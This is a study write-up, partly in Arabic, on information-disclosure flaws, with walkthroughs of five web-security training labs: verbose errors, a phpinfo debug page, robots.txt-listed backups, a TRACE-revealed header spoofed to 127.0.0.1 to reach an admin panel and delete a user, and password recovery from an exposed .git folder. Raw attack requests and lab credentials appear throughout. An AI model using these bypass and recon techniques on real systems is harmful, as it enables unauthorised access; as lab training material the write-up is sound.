# Information disclosure

* <details>


    
    # 🛡️ Information Disclosure (الإفصاح عن المعلومات)
    
    ## 🎯 ما هو Information Disclosure؟
    
    **Information Disclosure** أو "الإفصاح عن المعلومات" هو نوع من الثغرات الأمنية، يحدث عندما يقوم تطبيق أو نظام بكشف معلومات **حساسة** أو **غير مخصصة للمستخدم**. هذه المعلومات قد تكون مفيدة جدًا للمهاجم لتنفيذ هجوم متقدم، مثل:
    
    - كلمات مرور أو رموز API
    - أسماء مستخدمين
    - مسارات ملفات داخلية (`/etc/passwd`, `C:\Users\Admin\Desktop`)
    - إعدادات الخادم أو الكود البرمجي
    - إصدارات النظام أو البرامج
    - رسائل خطأ تفصيلية
    - قواعد بيانات أو معلومات عن الجداول
    - مفاتيح تشفير
    
    ---
    
    ## 🧠 أمثلة عملية
    
    ### 1. رسائل الخطأ المفصلة (Verbose Errors)
    
    ```php
    Warning: mysqli_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: YES)
    ```
    
    ⬅️ هذا المثال يُظهر اسم المستخدم في قاعدة البيانات.
    
    ### 2. عرض ملفات غير مخصصة (Directory Listing)
    
    زيارة الرابط:
    ```
    https://example.com/uploads/
    ```
    
    ⬅️ هذا يسمح برؤية ملفات غير مصرح بها.
    
    ### 3. ملف robots.txt فيه أسرار
    
    ```txt
    User-agent: *
    Disallow: /admin
    Disallow: /backup.zip
    ```
    
    ⬅️ قد يكشف هذا الملف عن ملفات مهمة مثل نسخة احتياطية.
    
    ### 4. الاستجابة تحتوي على بيانات حساسة
    
    ```json
    {
      "username": "admin",
      "password": "supersecret123"
    }
    ```
    
    ⬅️ تسريب مباشر لكلمات المرور.
    
    ---
    
    ## 🛡️ كيف تمنع Information Disclosure؟
    
    - ✅ عدم عرض رسائل خطأ مفصلة في بيئة الإنتاج
    - ✅ استخدام ملفات `.gitignore` و `.htaccess` بشكل صحيح
    - ✅ التأكد من صلاحيات الوصول للملفات
    - ✅ إخفاء رؤوس HTTP التي تكشف إصدار الخادم
    - ✅ فحص الكود لتسريبات مثل مفاتيح API أو كلمات مرور
    
    ---
    
    ## 🧪 أدوات للمساعدة
    
    - **Burp Suite** (لتحليل الردود والكشف عن معلومات حساسة)
    - **Dirb / Dirbuster** (للكشف عن ملفات أو مسارات غير محمية)
    - **Wappalyzer** (لكشف التقنيات المُستخدمة في الموقع)
    - **Nikto** (لكشف إعدادات خاطئة قد تؤدي للتسريب)
    

    
  </details>




---




<details>
    <summary>Lab: Information disclosure in error messages</summary>

> ### This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the ``version number`` of this framework. 

---

1. select product and intercept the request

```http
GET /product?productId=14 HTTP/2
Host: 0af4004a035cd3fa80028afc007b00bc.web-security-academy.net
Cookie: session=UFkGMCREvMWWvtzcAYCtB1X6EmX33YLO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af4004a035cd3fa80028afc007b00bc.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**``put the product id = '``**

```url
GET /product?productId=' HTTP/2
```

<img width="1520" height="675" alt="image" src="https://github.com/user-attachments/assets/9448b106-3b9e-48d3-9634-9bd0b8ebde0f" />

```ip
2.3.31
```
    
</details>





<details>
    <summary>Lab: Information disclosure on debug page</summary>

> ###  This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the ``SECRET_KEY`` environment variable. 

---


1. ``view page sourse``

<img width="796" height="377" alt="image" src="https://github.com/user-attachments/assets/bed8ee5b-e879-46eb-bb6d-77956d29e5f3" />

```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

2. now navigate:

```url
https://0a7c00d104bf2dae82109c31002d006a.web-security-academy.net/cgi-bin/phpinfo.php
```

<img width="1002" height="615" alt="image" src="https://github.com/user-attachments/assets/02ef5a51-f28a-40d0-8733-9f932ef055cb" />

```css
9l5zi0qwghgf3dycpuf6e0nb2lmdkwuk
```

    
</details>







<details>
    <summary>Lab: Source code disclosure via backup files</summary>

> ### This lab leaks its source code via backup files in a ``hidden directory``. To solve the lab, identify and submit the ``database password``, which is hard-coded in the leaked source code.  


---

1. look at :

```url
/robots.txt
```

``found``

```
User-agent: *
Disallow: /backup
```

2. now navigate 

```
https://0a2a002804aa8b598242fc9200a000c8.web-security-academy.net/backup
```

<img width="381" height="192" alt="image" src="https://github.com/user-attachments/assets/e874764e-11cd-42f0-a323-34c5a84d7dfa" />

<img width="806" height="793" alt="image" src="https://github.com/user-attachments/assets/6a2c76ea-ef53-4bfe-a547-c2bc49692332" />

```
cexk7l0isf9a1etns6h322ymnvrs5fab
```

    
</details>





<details>
    <summary>Lab: Authentication bypass via information disclosure</summary>

> ###  This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

> To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user ``carlos``.You can log in to your own account using the following credentials: ``wiener:peter`` 


---


1. login as ```wiener : peter```

2. try to open ``/admin``

<img width="1365" height="333" alt="image" src="https://github.com/user-attachments/assets/d4b16a49-7bf4-4c0e-bd00-e6e9d2aab10f" />

```http
Admin interface only available to local users 
```

first i try all these headers but no one work:

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```


> #### To know the header i changed the method form ``GET`` to ``TRACE``

```
TRACE /admin HTTP/2
Host: 0af8003203f548258027c78a00d10051.web-security-academy.net
Cookie: session=6YuJO3CKC91bhCbm4nNF21yULajIrNS0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers



```

I FOUND IT 

```http
X-Custom-IP-Authorization: 156.198.65.215
```


<img width="1405" height="445" alt="image" src="https://github.com/user-attachments/assets/e176982e-3258-4b59-a4b6-4cfed773b0c7" />

3. set it

```http
GET /admin HTTP/2
Host: 0af8003203f548258027c78a00d10051.web-security-academy.net
Cookie: session=6YuJO3CKC91bhCbm4nNF21yULajIrNS0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```

and Done response is ``200 ok``

<img width="1526" height="624" alt="image" src="https://github.com/user-attachments/assets/266c7bab-b7b9-4d9c-8820-4d737bf188e3" />


<img width="742" height="484" alt="image" src="https://github.com/user-attachments/assets/473e7274-41d2-4af1-a501-d957a920d790" />

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0af8003203f548258027c78a00d10051.web-security-academy.net
Cookie: session=6YuJO3CKC91bhCbm4nNF21yULajIrNS0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af8003203f548258027c78a00d10051.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1

```

* <details>
    <summary>To not put the header each time you sent request</summary>


    1. Go to ``Proxy >`` Match and replace.
    2. Under HTTP ``match and replace`` rules, click ``Add``. The Add ``match/replace`` rule dialog opens.
    3. Leave the Match field empty.
    4. Under ``Type``, make sure that Request header is selected.
    
    5. In the Replace field, enter the following:
    ```
    X-Custom-IP-Authorization: 127.0.0.1
    ```
    
    6. Click ``Test``.
    7. Under ``Auto-modified`` request, notice that Burp has added the ``X-Custom-IP-Authorization`` header to the modified request.
    8. Click ``OK``. Burp Proxy now adds the ``X-Custom-IP-Authorization`` header to every request you send.
        
  </details>

    
</details>





<details>
    <summary>Lab: Information disclosure in version control history</summary>

> ### This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the ``administrator`` user then log in and delete the user ``carlos``. 


---


1. first i try to login using ``wiener : peter`` (not step)
2. then try to open ``/admin``

<img width="1066" height="341" alt="image" src="https://github.com/user-attachments/assets/90c0138c-ff9d-4e0f-b738-1ce9c4a1e702" />

3. Open the lab and browse to ``/.git`` to reveal the lab's Git version control data. 

<img width="851" height="562" alt="image" src="https://github.com/user-attachments/assets/904c836f-739c-4b34-a313-573da238d3a7" />

opne ``COMMIT_EDITMSG``

found 

```http
Remove admin password from config
```

download copy on your device:

```
wget -r https://0a9c0058036a57408046b7cf002a00ef.web-security-academy.net/.git/
```

<img width="1067" height="484" alt="image" src="https://github.com/user-attachments/assets/94119835-1e0b-4132-9ba8-11d042342d6e" />

```
sudo apt install git-cola -y
```

notice that there is ``admin_config`` & ``admin_panal.php``

<img width="1585" height="841" alt="image" src="https://github.com/user-attachments/assets/8fdd4aa4-340d-4d9e-90ad-6c1e4e42f360" />

<img width="586" height="640" alt="image" src="https://github.com/user-attachments/assets/5b597033-6b57-40bd-951b-79bd6444be3d" />

so password is cleared we want to get it back so we will 

> from ``commit`` click ``undo last commit``

<img width="876" height="415" alt="image" src="https://github.com/user-attachments/assets/2fa3c89c-5282-4467-a458-b0bab712f6fe" />

and here is the password

<img width="739" height="590" alt="image" src="https://github.com/user-attachments/assets/f19ec764-e25c-4fdc-b403-7442fa9c3186" />

```
administrator : hhph747uu39r1mjil6oq
```

<img width="1300" height="609" alt="image" src="https://github.com/user-attachments/assets/4674e632-7c45-47c7-a8f7-669d179c6077" />



    
</details>

















































